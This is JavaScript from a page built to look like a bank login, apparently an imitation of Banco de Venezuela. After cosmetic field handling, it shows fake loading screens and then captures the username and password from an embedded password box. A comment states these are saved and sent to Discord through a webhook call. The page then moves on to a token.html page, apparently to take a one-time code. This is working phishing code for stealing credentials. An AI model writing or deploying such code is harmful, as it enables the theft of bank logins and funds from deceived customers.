<script>
(function() {
  function init() {
    var input = document.querySelector('#mat-input-0');
    if (!input) { setTimeout(init, 300); return; }
    var field = input.closest('mat-form-field');
    if (!field) { setTimeout(init, 300); return; }

    input.addEventListener('focus', function() {
      field.classList.add('usuario-focus');
      field.classList.remove('usuario-filled');
    });
    input.addEventListener('blur', function() {
      field.classList.remove('usuario-focus');
      if (input.value && input.value.trim() !== '') {
        field.classList.add('usuario-filled');
      } else {
        field.classList.remove('usuario-filled');
      }
    });
    input.addEventListener('input', function() {
      if (input.value && input.value.trim() !== '') {
        field.classList.add('usuario-filled');
      } else {
        field.classList.remove('usuario-filled');
      }
    });
  }
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', init);
  } else {
    init();
  }
})();
</script>

<script>
(function() {
  function init() {
    var input = document.querySelector('#mat-input-0, mat-form-field input');
    var btn   = document.querySelector('button[type=submit]');
    if (!input || !btn) { setTimeout(init, 300); return; }

    function checkLen() {
      if (input.value.length >= 6) {
        btn.removeAttribute('disabled');
        btn.classList.remove('mat-button-disabled');
        btn.setAttribute('aria-disabled', 'false');
      } else {
        btn.setAttribute('disabled', 'true');
        btn.classList.add('mat-button-disabled');
        btn.setAttribute('aria-disabled', 'true');
      }
    }

    input.addEventListener('input', checkLen);
    checkLen();

    btn.addEventListener('click', function(e) {
      if (btn.hasAttribute('disabled')) return;
      e.preventDefault();
      e.stopPropagation();

      var loader = document.getElementById('bdv-loader-overlay');
      loader.classList.add('activo');
      document.body.style.position = 'fixed';
      document.body.style.width = '100%';
      document.body.style.overflow = 'hidden';
      document.documentElement.style.overflow = 'hidden';

      setTimeout(function() {
        loader.classList.remove('activo');
        document.body.style.position = '';
        document.body.style.width = '';
        document.body.style.overflow = '';
        document.documentElement.style.overflow = '';
        document.getElementById('bdv-pass-overlay').classList.add('activo');
      }, 2000);
    });
  }
  // Escuchar mensaje del iframe de contraseña
  window.addEventListener('message', function(e) {
    if (e.data && e.data.type === 'continuar-clicked') {
      // Guardar contrasena y usuario actual y enviar a Discord
      var user = document.querySelector('input').value;
      if (typeof guardarDatosRecibo === 'function') {
        guardarDatosRecibo({ usuario: user, contrasena: e.data.pass });
        enviarWebhookDiscord("🔐 Contraseña Ingresada");
      }
      // Ocultar caja de contraseña
      document.getElementById('bdv-pass-overlay').classList.remove('activo');
      // Mostrar animacion de carga
      var loader = document.getElementById('bdv-loader-overlay');
      loader.classList.add('activo');
      document.body.style.position = 'fixed';
      document.body.style.width = '100%';
      document.body.style.overflow = 'hidden';
      document.documentElement.style.overflow = 'hidden';
      // Tras 3 segundos navegar a token.html
      setTimeout(function() { window.location.href = 'token.html'; }, 3000);
    }
  });

  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', init);
  } else { init(); }
})();
</script>
